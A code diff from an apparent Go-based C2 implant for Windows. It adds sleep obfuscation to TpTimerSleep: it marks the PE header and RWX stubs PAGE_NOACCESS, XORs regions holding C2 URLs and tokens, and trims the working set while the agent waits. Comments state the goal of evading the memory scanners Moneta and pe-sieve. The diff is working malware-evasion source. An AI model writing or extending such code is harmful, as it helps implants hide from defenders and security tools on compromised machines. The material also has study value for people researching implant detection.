@@ -212,8 +212,14 @@ func TpTimerSleep(d time.Duration) {
 		return
 	}
 
-	// XOR the agent's sensitive memory regions and trim the working set
-	// while we wait — standard sleep obfuscation.
+	// Apply all sleep-obfuscation layers before entering the wait:
+	//   1. PAGE_NOACCESS on PE header + private RWX stubs (Moneta / pe-sieve)
+	//   2. XOR-obfuscate registered sensitive regions (C2 URLs, tokens)
+	//   3. Trim working set (fewer resident pages for scanners)
+	regions := collectProtectedRegions()
+	for i := range regions {
+		regions[i].hide()
+	}
 	xorRegions()
 	trimWorkingSet()
 
@@ -226,5 +232,8 @@ func TpTimerSleep(d time.Duration) {
 		windows.WaitForSingleObject(hEvent, windows.INFINITE)
 	}
 
-	xorRegions() // restore
+	xorRegions() // restore XOR
+	for i := range regions {
+		regions[i].show() // restore PAGE_NOACCESS → original protection
+	}
 }
